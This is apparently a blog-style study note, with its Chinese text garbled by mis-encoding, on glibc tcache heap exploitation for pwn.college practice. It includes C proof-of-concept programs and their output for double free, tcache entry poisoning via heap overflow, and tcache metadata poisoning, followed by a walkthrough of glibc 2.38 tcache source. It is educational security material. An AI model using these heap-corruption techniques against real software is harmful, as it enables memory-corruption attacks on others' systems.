<h4 id="Double-Freeé€ æˆé‡å¤å¼•ç”¨"><a href="#Double-Freeé€ æˆé‡å¤å¼•ç”¨" class="headerlink" title="Double Freeé€ æˆé‡å¤å¼•ç”¨"></a>Double Freeé€ æˆé‡å¤å¼•ç”¨</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> * chunk1;</span><br><span class="line">    <span class="type">size_t</span> * chunk1_dup;</span><br><span class="line"></span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    chunk1[<span class="number">1</span>] = <span class="number">0</span>;      <span class="comment">//æŠŠkeyæ‰¬äº†</span></span><br><span class="line">    <span class="built_in">free</span>(chunk1);       <span class="comment">//double free</span></span><br><span class="line"></span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);			</span><br><span class="line">    chunk1_dup = <span class="built_in">malloc</span>(<span class="number">0x20</span>);		<span class="comment">//duplicated reference</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk1 @ %p\n&quot;</span>,chunk1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk1_dup @ %p\n&quot;</span>,chunk1_dup);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test# gcc df.c -o <span class="built_in">df</span> -w </span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test# ./df</span><br><span class="line">chunk1 @ 0x555596ef62a0</span><br><span class="line">chunk1_dup @ 0x555596ef62a0</span><br></pre></td></tr></table></figure>



<h4 id="tcache-overflow-å¯¼è‡´-tcache-entry-poisoning"><a href="#tcache-overflow-å¯¼è‡´-tcache-entry-poisoning" class="headerlink" title="tcache overflow å¯¼è‡´ tcache entry poisoning"></a>tcache overflow å¯¼è‡´ tcache entry poisoning</h4><p>å¯ä»¥åˆ©ç”¨å †æº¢å‡ºé€ æˆä»»æ„åœ°å€è¯»å†™</p>
<p>1.å…ˆåè¿ç»­åˆ†é…ä¸¤ä¸ªå †å—<code>chunk1</code>,<code>chunk2</code>,ä½¿å…¶åœ°å€ç‰©ç†ä¸Šç›¸é‚»,è¿™æ ·<code>chunk2</code>ä½äºå†…å­˜é«˜å¤„, <code>chunk1</code>å¯ä»¥ä»ä½å¤„å¾€é«˜å¤„æº¢å‡º</p>
<p>2.é‡Šæ”¾<code>chunk2</code>ä½¿å…¶è¿”å›åˆ°<code>tcache</code>ä¸­</p>
<p>3.ä»<code>chunk1</code>å¼€å§‹æº¢å‡º,æ„é€ <code>chunk2</code>çš„å‡å¤´,å¹¶ä¿®æ”¹<code>chunk2</code>çš„<code>next</code>æŒ‡é’ˆæŒ‡å‘ä¸€ä¸ªå¸Œæœ›çš„åœ°å€<code>target_addr</code></p>
<p>4.å†åˆ†é…ä¸€æ¬¡,æ‹¿å‡º<code>chunk2</code></p>
<p>5.å†åˆ†é…ä¸€æ¬¡,æ‹¿å‡º<code>target_addr</code></p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯,<code>glibc2.31</code>ä¸­,åˆ¤æ–­<code>tcache</code>ä¸­æ˜¯å¦è¿˜æœ‰å †å—çš„ä¾æ®æ˜¯<code>counts[idx]</code>è®¡æ•°,è€Œä¸æ˜¯çœ‹æŒ‡é’ˆæ˜¯å¦ä¸ºç©º</p>
<p>å› æ­¤å¯ä»¥æ‰¾ç‚®ç°å †å—å¡«çº¿,æ»¥ç«½å……æ•°ä¸€ä¸‹æŠŠ<code>counts</code>å«é«˜</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241015134751799.png" alt="image-20241015134751799"></p>
<p>å‡è®¾<code>chunk1</code>å’Œ<code>chunk2</code>éƒ½æ˜¯<code>malloc(0x20)</code>è·å–çš„å †å—,é‚£ä¹ˆç«™åœ¨<code>chunk1_mem</code>è§†è§’ä¸Š</p>
<table>
<thead>
<tr>
<th>item</th>
<th>offset based on chunk1_mem</th>
<th>value</th>
</tr>
</thead>
<tbody><tr>
<td>chunk1_mem</td>
<td>0</td>
<td>pad</td>
</tr>
<tr>
<td></td>
<td>â€¦</td>
<td>pad</td>
</tr>
<tr>
<td>chunk2_prev_size</td>
<td>+ 0x20</td>
<td>pad</td>
</tr>
<tr>
<td>chunk2_size</td>
<td>+ 0x28</td>
<td>0x31</td>
</tr>
<tr>
<td>chunk2_next</td>
<td>+ 0x30</td>
<td>target_addr</td>
</tr>
<tr>
<td>chunk2_key</td>
<td>+ 0x38</td>
<td>ä¸å˜</td>
</tr>
</tbody></table>
<p>å†™ä¸ªpocæ„æ€æ„æ€</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[] = <span class="string">&quot;flag&#123;aaaa&#125;&quot;</span>;</span><br><span class="line">    <span class="type">size_t</span> * chunk1_mem;</span><br><span class="line">    <span class="type">size_t</span> * chunk2_mem;</span><br><span class="line">    <span class="type">size_t</span> * chunkbait;</span><br><span class="line">    <span class="type">size_t</span> * chunk2_mem_next;</span><br><span class="line">    <span class="type">size_t</span> * victim;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;buffer now is %s\n&quot;</span>,buffer);</span><br><span class="line"></span><br><span class="line">    chunk1_mem = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    chunk2_mem = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    chunkbait = <span class="built_in">malloc</span>(<span class="number">0x20</span>);   <span class="comment">//ç‚®ç°</span></span><br><span class="line">    <span class="built_in">free</span>(chunkbait);</span><br><span class="line">    <span class="built_in">free</span>(chunk2_mem);</span><br><span class="line"></span><br><span class="line">    chunk2_mem_next = (<span class="type">char</span>*)chunk1_mem + <span class="number">0x30</span>;<span class="comment">//å‡è®¾chunk1ä¸Šoverflowèƒ½è¦†ç›–chunk2 metadata</span></span><br><span class="line">    chunk2_mem_next[<span class="number">0</span>] = buffer;	<span class="comment">//bufferæ²¾äº²å¸¦æ•…åŠ å…¥äº†tcache</span></span><br><span class="line"></span><br><span class="line">    chunk2_mem = <span class="built_in">malloc</span>(<span class="number">0x20</span>);		</span><br><span class="line">    victim = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(victim,<span class="string">&quot;flag&#123;bbbb&#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;buffer now is %s\n&quot;</span>,buffer);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ‰§è¡Œç»“æœ</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/level15.0# gcc test.c -o <span class="built_in">test</span> -w</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/level15.0# ./test</span><br><span class="line">buffer now is flag&#123;aaaa&#125;</span><br><span class="line">buffer now is flag&#123;bbbb&#125;</span><br><span class="line">*** stack smashing detected ***: terminated</span><br><span class="line">Aborted (core dumped)</span><br></pre></td></tr></table></figure>



<h4 id="tcache-entry-poisoningå¯¼è‡´tcache-metadata-poisoning"><a href="#tcache-entry-poisoningå¯¼è‡´tcache-metadata-poisoning" class="headerlink" title="tcache entry poisoningå¯¼è‡´tcache metadata poisoning"></a>tcache entry poisoningå¯¼è‡´tcache metadata poisoning</h4><p>ä¹‹å‰æˆ‘ä»¬<code>tcache poisoning</code>éƒ½æ˜¯è¿™æ ·è€ƒè™‘çš„:</p>
<p>1.mallocä¸€ä¸ªå †å—</p>
<p>2.freeè¯¥å †å—è¿›å…¥tcache</p>
<p>3.UAFä¿®æ”¹è¯¥å †å—çš„nextæŒ‡é’ˆ,æŒ‡å‘ç›®æ ‡åœ°å€</p>
<p>4.mallocæ‹¿å‡ºè¯¥å †å—</p>
<p>5.mallocæ‹¿å‡ºç›®æ ‡åœ°å€å‡å †å—</p>
<p>æˆ‘ä»¬çš„ç›®å…‰å±€é™åœ¨äº†å †å—ä¸Š,ç„¶è€Œå®é™…ä¸Šå¯¹å †å—çš„æŠ•æ¯’,ä¹Ÿä¼šä¼ æŸ“ç»™å…ƒæ•°æ®,å¹¶ä¸”è¿˜ä¼šä¼ æŸ“ç»™åç»­çš„å †å—,è€ƒè™‘å¦‚ä¸‹åœºæ™¯:</p>
<p>1.åˆ©ç”¨UAFå°†<code>fake_chunk</code>ä¹ŸåŠ å…¥åˆ°<code>tcache</code>ä¸­</p>
<p>è¿™ä¸ª<code>fake_chunk</code>çš„<code>next=0xcafebabe</code> æ˜¯ä¸€ä¸ªä»»æ„å€¼, æ˜¾ç„¶ä¸æ˜¯ä¸€ä¸ªåˆæ³•åœ°å€</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241015203432281.png" alt="image-20241015203432281"></p>
<p>2.ä¸€ä¸ª<code>malloc</code>æŠŠ<code>chunk1</code>æ‹¿å‡ºæ¥,æ­¤æ—¶æ¡¶å­å¤´æŒ‡å‘äº†<code>fake_chunk</code></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241015203623434.png" alt="image-20241015203623434"></p>
<p>3.å†ä¸€ä¸ª<code>malloc</code>æŠŠ<code>fake_chunk</code>æ‹¿å‡ºæ¥,é‚£ä¹ˆæ¡¶å­å¤´ä¼šç»§æ‰¿<code>fake_chunk.next</code></p>
<p>å¹¶ä¸”<code>tcache</code>ä¸­çš„å †å—è¢«é‡æ–°åˆ†é…æ—¶,å…¶<code>key</code>ä¼šè¢«ç½®é›¶,å› æ­¤<code>fake_chunk_addr</code><strong>åç§»8å­—èŠ‚å¤„çš„8ä¸ªå­—èŠ‚</strong>ä¼šè¢«ç½®é›¶</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241015204025478.png" alt="image-20241015204025478"></p>
<p>4.æ­¤æ—¶<code>free</code>ä¸€ä¸ªåŒæ ·å¤§å°çš„å †å—è¿›å…¥<code>tcache</code>,ç”±äºå…ƒæ•°æ®å·²ç»è¢«æŠ•æ¯’,æ–°å †å—ä¼šç»§æ‰¿æ¡¶å­å¤´çš„<code>next</code>æŒ‡é’ˆ,ä¹Ÿå°±æ˜¯<code>0xcafebabe</code></p>
<p>æ­¤æ—¶å¦‚æœæœ‰<code>chunk2</code>çš„<code>UAF</code>å°±å¯ä»¥æ³„éœ²<code>0xcafebabe</code>è¿™ä¸ªå€¼</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241015204205909.png" alt="image-20241015204205909"></p>
<p>å†™ä¸ªpocæ„æ€æ„æ€</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> * chunk1;</span><br><span class="line">    <span class="type">size_t</span> * chunk2;</span><br><span class="line">    <span class="type">size_t</span> * chunk_bait;</span><br><span class="line">    <span class="type">size_t</span> fake_chunk_header[<span class="number">4</span>];</span><br><span class="line">    <span class="type">size_t</span> *fake_chunk = (<span class="type">char</span>*)fake_chunk_header + <span class="number">0x10</span>; </span><br><span class="line">    fake_chunk[<span class="number">0</span>] = <span class="number">0xcafebabe</span>;</span><br><span class="line">    fake_chunk[<span class="number">1</span>] = <span class="number">0xdeadbeef</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;previous fake_chunk.key = %p\n&quot;</span>, fake_chunk[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk_bait = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">free</span>(chunk_bait);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    chunk1[<span class="number">0</span>] = fake_chunk;</span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    fake_chunk = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;now fake_chunk.key = %p\n&quot;</span>, fake_chunk[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk2.next = %p\n&quot;</span>, chunk2[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">return</span>  <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test# gcc metadata.c -o metadata -g -w</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test# ./metadata</span><br><span class="line">previous fake_chunk.key = 0xdeadbeef</span><br><span class="line">now fake_chunk.key = (nil)</span><br><span class="line">chunk2.next = 0xcafebabe</span><br></pre></td></tr></table></figure>







<h3 id="glibc-2-38"><a href="#glibc-2-38" class="headerlink" title="glibc-2.38"></a>glibc-2.38</h3><p>æ•°æ®ç»“æ„ä¸<code>glibc-2.31</code>ç›¸æ¯”,åœ¨æ•°æ®ç»“æ„ä¸Šå¹¶æ— å¤ªå¤§å˜åŒ–, ä½†æ˜¯ç€é‡åŠ å›ºäº†<code>key</code>å’Œ<code>next</code>å­—æ®µçš„è®¡ç®—ç®—æ³•, ç›®çš„æ˜¯ä¸ºäº†å°½é‡ç¼“è§£<code>double free</code></p>
<h4 id="datastructure-2"><a href="#datastructure-2" class="headerlink" title="datastructure"></a>datastructure</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">    <span class="type">uintptr_t</span> key;</span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint16_t</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">    tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure>

<p><code>key</code>ä¸å†æ˜¯<code>tcache</code>åŸºåœ°å€,è€Œæ˜¯ä¸€ä¸ªéšæœºæ•°</p>
<p><code>next</code>ä¸å†æ˜¯æ˜æ–‡çš„ä¸‹ä¸€ä¸ªå †å—åœ°å€,åŠ äº†å¯†äº†,ç›–äº†å¸½äº†</p>
<h4 id="algorithm-2"><a href="#algorithm-2" class="headerlink" title="algorithm"></a>algorithm</h4><h5 id="key-init"><a href="#key-init" class="headerlink" title="key init"></a>key init</h5><p>åœ¨<code>malloc.c</code>ä¸­æœ‰ä¸€ä¸ªé™æ€å˜é‡<code>tcache_key</code>, æ¯ä¸€ä¸ªè¢«æ”¾åˆ°<code>tcahce</code>ä¸­çš„å †å—, éƒ½ä¼šæ‹·è´ä¹‹ä½œä¸ºè‡ªå·±çš„<code>key</code></p>
<p>ä¸<code>glibc-2.31</code>ä¸Šç›´æ¥ä½¿ç”¨<code>tcache</code>åœ°å€ä½œä¸º<code>key</code>ä¸åŒ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">uintptr_t</span> tcache_key;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªå€¼ä¼šåœ¨ç¬¬ä¸€æ¬¡è°ƒç”¨<code>malloc</code>æ—¶, åœ¨æ•´ä¸ªå †åˆå§‹åŒ–ä¹‹å‰, ç‡å…ˆåˆå§‹åŒ–, åŒ…æ‹¬<code>fopen</code>ç­‰æ“ä½œé—´æ¥è°ƒç”¨çš„<code>malloc</code></p>
<p>æ•´ä¸ªåˆå§‹åŒ–è¿‡ç¨‹æ˜¯è¿™æ ·çš„</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">malloc</span> @ <span class="built_in">malloc</span>/<span class="built_in">malloc</span>.c</span><br><span class="line">	ptmalloc_init @ <span class="built_in">malloc</span>/arena.c</span><br><span class="line">		tcache_key_initialize</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_key_initialize</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (__getrandom_nocancel(&amp;tcache_key, <span class="keyword">sizeof</span>(tcache_key), GRND_NONBLOCK) != <span class="keyword">sizeof</span>(tcache_key))</span><br><span class="line">    &#123;</span><br><span class="line">        tcache_key = random_bits();</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __WORDSIZE == 64</span></span><br><span class="line">        tcache_key = (tcache_key &lt;&lt; <span class="number">32</span>) | random_bits();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç»™ä¸€ä¸ªéšæœºæ•°ä½œä¸º<code>tcache_key</code>, æ­¤åæœ¬è¿›ç¨‹æ‰§è¡ŒæœŸé—´ä¸å†æ›´æ¢<code>tcache_key</code>, æ‰€æœ‰åŠ å…¥<code>tcache</code>çš„å †å—éƒ½è¦æ‹·è´è¯¥<code>key</code>å€¼</p>
<h5 id="malloc-2"><a href="#malloc-2" class="headerlink" title="malloc"></a>malloc</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">malloc =&gt; __libc_malloc</span><br><span class="line">	=&gt; tcache_get</span><br></pre></td></tr></table></figure>

<p><code>malloc</code>å’Œä¹‹å‰çš„ç‰ˆæœ¬æ— å¤ªå¤§åŒºåˆ«</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//@ __libc_malloc</span></span><br><span class="line"><span class="type">size_t</span> tc_idx = csize2tidx(tbytes);		<span class="comment">//æ¡¶å­ä¸‹æ ‡</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache != <span class="literal">NULL</span> &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>)</span><br><span class="line">&#123;	</span><br><span class="line">    victim = tcache_get(tc_idx);</span><br><span class="line">    <span class="keyword">return</span> tag_new_usable(victim);	<span class="comment">//ä½œç”¨ä¸å¤§</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span><span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> tcache_get_n(tc_idx, &amp;tcache-&gt;entries[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get_n</span><span class="params">(<span class="type">size_t</span> tc_idx, tcache_entry **ep)</span></span><br><span class="line">&#123;</span><br><span class="line">    tcache_entry *e;</span><br><span class="line">    <span class="keyword">if</span> (ep == &amp;(tcache-&gt;entries[tc_idx]))</span><br><span class="line">        e = *ep;			<span class="comment">//æ­£å¸¸tcacheè°ƒç”¨çš„tcache_get_nèµ°æ­¤åˆ†æ”¯</span></span><br><span class="line">    <span class="keyword">else</span>				</span><br><span class="line">        e = REVEAL_PTR(*ep);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely(!aligned_OK(e)))</span><br><span class="line">        malloc_printerr(<span class="string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);</span><br><span class="line">		<span class="comment">//#define aligned_OK(m)  (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) == 0) è¦æ±‚å †å—åŸºåœ°å€ä½ä¸‰ä½å…¨ä¸º0,æ³¨æ„æ˜¯ä½ä¸‰ä½ä½ä½</span></span><br><span class="line">    <span class="keyword">if</span> (ep == &amp;(tcache-&gt;entries[tc_idx]))		</span><br><span class="line">        *ep = REVEAL_PTR(e-&gt;next);			<span class="comment">//å¼‚æˆ–è§£ç nextæŒ‡é’ˆ, æ­£å¸¸tcacheè°ƒç”¨çš„tcache_get_nèµ°æ­¤åˆ†æ”¯</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        *ep = PROTECT_PTR(ep, REVEAL_PTR(e-&gt;next));</span><br><span class="line"></span><br><span class="line">    --(tcache-&gt;counts[tc_idx]);		<span class="comment">//æ›´æ–°è®¡æ•°å™¨</span></span><br><span class="line">    e-&gt;key = <span class="number">0</span>;						<span class="comment">//é˜²æ­¢æ³„éœ²key</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="type">void</span> *)e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>è¿™ä¸ª<code>tcache_get_n</code>çœ‹ä¸Šå»ååˆ†è¯¡å¼‚</p>
<p>åœ¨<code>tcache_get_n(tc_idx, &amp;tcache-&gt;entries[tc_idx]);</code>ä¼ å‚å·²ç»å¾ˆæ˜ç¡®äº†,ä¸ºå•¥è¿˜è¦å†åˆ¤æ–­ä¸€ä¸‹å‘¢?</p>
<p>è¿™æ˜¯å› ä¸ºå†å¦ä¸€ä¸ªå‡½æ•°<code>_mid_memalign</code>ä¸­ä¼šç›´æ¥è°ƒç”¨<code>tcache_get_n</code>å¹¶ä¸”è¿™é‡Œè·å–çš„å †å—ä¸ä¸€å®šæ˜¯æ¡¶å­å¤´,å› æ­¤è¦æ ¹æ®æ‹¿èµ°çš„å †å—æ˜¯å¤´å—è¿˜æ˜¯åæ¥å—è¿›è¡ŒåŒºåˆ†</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">tcache_entry **tep = &amp; tcache-&gt;entries[tc_idx];</span><br><span class="line">tcache_entry *te = *tep;</span><br><span class="line"><span class="keyword">while</span> (te != <span class="literal">NULL</span> &amp;&amp; !PTR_IS_ALIGNED (te, alignment))</span><br><span class="line">  &#123;</span><br><span class="line">    tep = &amp; (te-&gt;next);</span><br><span class="line">    te = tcache_next (te);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">if</span> (te != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">void</span> *victim = tcache_get_n (tc_idx, tep);</span><br><span class="line">    <span class="keyword">return</span> tag_new_usable (victim);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>ä¸ºä»€ä¹ˆä¼šæœ‰å¤´å—å’Œå…¶ä»–å—çš„åŒºåˆ«å‘¢?</p>
<p>ä»¥ä¸ºåœ¨<code>free</code>æ—¶, <code>tcache-&gt;entries[tc_idx]</code>æ¡¶å­å¤´æŒ‡é’ˆä¸ä¼šè¢«åŠ å¯†, ä½†æ˜¯å †å—çš„nextæŒ‡é’ˆä¼šè¢«åŠ å¯†</p>
<p>å› æ­¤æ‹¿å¤´å—å‡ºæ¥,ä¸éœ€è¦å¯¹ <code>tcache-&gt;entries[tc_idx]</code>æŒ‡é’ˆè§£å¯†</p>
<p>ä½†æ˜¯ä»ä¸­é—´æ‰£ä¸€å—å‡ºæ¥éœ€è¦è§£å¯†</p>
</blockquote>
<p>ç®€å•æ¥è¯´<code>tcache_get_n</code>å¹²äº†è¿™ä¸‰ä¸ªäº‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ep =  &amp;tcache-&gt;entries[tc_idx]</span><br><span class="line">e = *ep</span><br><span class="line"> *ep = REVEAL_PTR(e-&gt;next);</span><br></pre></td></tr></table></figure>

<p><code>ep</code>å°±æ˜¯æ¡¶å­å¤´, </p>
